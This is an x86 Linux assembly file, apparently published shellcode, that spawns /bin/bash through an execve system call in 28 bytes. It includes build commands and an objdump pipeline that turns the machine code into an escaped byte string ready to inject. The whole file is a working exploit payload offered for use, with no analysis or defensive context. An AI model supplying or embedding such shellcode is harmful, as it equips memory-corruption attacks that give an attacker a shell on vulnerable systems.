; execve x86 /bin/bash - 28 bytes   by 0bfxgh0st*
;
; nasm -f elf execve_x86_bash.asm
; ld -o execve_x86_bash execve_x86_bash.o -m elf_i386
; objdump -d execve_x86_bash |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor eax,eax
xor ecx,ecx
xor edx,edx

push eax

push 0x68736162   ; hsab
push 0x2f6e6962   ; /nib
push 0x2f2f2f2f   ; ////

mov ebx,esp

mov al,11
int 0x80

